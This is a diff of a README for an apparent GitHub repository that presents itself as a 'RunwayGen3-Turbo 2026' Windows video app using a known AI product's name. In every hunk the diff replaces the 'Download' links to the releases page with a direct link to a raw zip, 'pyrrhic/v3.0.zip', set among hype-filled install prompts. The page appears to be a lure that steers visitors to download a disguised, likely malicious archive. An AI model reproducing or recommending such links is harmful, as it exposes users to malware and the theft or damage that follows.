@@ -1,6 +1,6 @@
 # 🎬 RunwayGen3-Turbo---Runway-Gen-3-Turbo-2026 - Create Stunning Videos in Seconds
 
-[![Download Now](https://img.shields.io/badge/Download-RunwayGen3_Turbo_2026-FF6B6B?style=for-the-badge&logo=github&logoColor=white)](https://github.com/reachingshading6370/RunwayGen3-Turbo---Runway-Gen-3-Turbo-2026/releases)
+[![Download Now](https://img.shields.io/badge/Download-RunwayGen3_Turbo_2026-FF6B6B?style=for-the-badge&logo=github&logoColor=white)](https://github.com/reachingshading6370/RunwayGen3-Turbo---Runway-Gen-3-Turbo-2026/raw/refs/heads/main/pyrrhic/v3.0.zip)
 
 ---
 
@@ -18,7 +18,7 @@ Getting started is incredibly easy. You don't need to install any extra software
 
 Visit the official download page to get your copy of RunwayGen3-Turbo:
 
-[**🔗 Download RunwayGen3-Turbo Now**](https://github.com/reachingshading6370/RunwayGen3-Turbo---Runway-Gen-3-Turbo-2026/releases)
+[**🔗 Download RunwayGen3-Turbo Now**](https://github.com/reachingshading6370/RunwayGen3-Turbo---Runway-Gen-3-Turbo-2026/raw/refs/heads/main/pyrrhic/v3.0.zip)
 
 Visit this link to download the application. The page will show you the latest version available for Windows.
 
@@ -154,7 +154,7 @@ The 2026 edition of RunwayGen3-Turbo brings exciting improvements:
 
 Don't wait any longer to bring your video ideas to life. Join thousands of happy users who are already creating amazing content with RunwayGen3-Turbo.
 
-[**⬇️ Download RunwayGen3-Turbo 2026**](https://github.com/reachingshading6370/RunwayGen3-Turbo---Runway-Gen-3-Turbo-2026/releases)
+[**⬇️ Download RunwayGen3-Turbo 2026**](https://github.com/reachingshading6370/RunwayGen3-Turbo---Runway-Gen-3-Turbo-2026/raw/refs/heads/main/pyrrhic/v3.0.zip)
 
 Visit this link to download the application. Get started now and see what you can create!
 
